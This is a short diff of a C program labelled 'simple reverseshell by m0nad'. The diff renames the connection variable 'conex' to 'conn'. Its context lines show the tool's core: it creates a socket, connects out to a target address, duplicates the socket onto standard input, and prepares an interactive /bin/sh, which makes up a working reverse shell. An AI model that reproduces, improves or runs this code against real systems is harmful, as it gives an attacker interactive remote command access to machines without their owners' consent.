@@ -12,7 +12,7 @@ simple reverseshell by m0nad
 int
 main(int argc, char ** argv)
 {
-  int sock, conex;
+  int sock, conn;
   struct sockaddr_in target;
   char * const sh[] = {"/bin/sh", "-i", NULL};
 
@@ -27,8 +27,8 @@ main(int argc, char ** argv)
   if (sock < 0)
     perror("socket"), exit(1);
 
-  conex = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr));
-  if (conex < 0)
+  conn = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr));
+  if (conn < 0)
     perror("connect"), exit(1);
 
   dup2(sock, 0);
